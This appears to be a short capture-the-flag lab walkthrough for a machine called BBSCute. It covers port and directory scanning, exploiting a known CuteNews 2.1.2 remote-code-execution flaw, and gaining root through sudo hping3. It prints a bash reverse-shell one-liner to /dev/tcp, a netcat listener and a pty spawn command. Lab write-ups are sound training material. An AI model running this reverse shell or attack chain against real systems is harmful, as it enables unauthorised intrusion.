Machine name: BBSCute
Machine IP: 192.168.213.128

#Recon and Enum.

We'll sart off with an nmap scan as always. For this,I did an initial scan of the top 1000 ports and a full nmap scan as well.

There are a number of open ports, I usually love to start with port 80 whenever I see one. Let's head over and check what's running here.

Navigating to http://192.168.213.128, we are met with a default apache page.

Let's run a quick dirb/gobuster scan on the port.

The /index.php looks interesting. A look there and we end up with a login page.
It also gives us more details, seems that it running some service called CuteNews news management system. We can enumerate this further and check if there are any known vulnerabilities.

The site is running on version 2.1.2

There are a ton of hits on searchsploit db. This is good news, seems as though this service is seriously vulnerable. Let's dig in some more.

There's a python Remote Code Execution exploit. This seems tasty. Let's see how this works and what it does.

we can mirror the code and have a look under the hood.

At first I tried to run the exploit but it did not work. So after some research, I found out that the exploit needed some editing. I went back and removed every /CuteNews part in every url in the code.

I ran the exploit and got a shell.

spawning a reverse shell to get a stable shell

running which nc on RHOST confirms nc is installed. So we'll spawn a reverse shell.

bash -c 'bash -i >& /dev/tcp/tun0_IP/4444 0>&1'

spinning up a nc listener on LHOST, nc -nlvp 4444

stable shell: python3 -c 'import pty; pty.spawn("/bin/bash")'


running sudo -l let's us know we can run hping3 as root.

run hping3 and get root.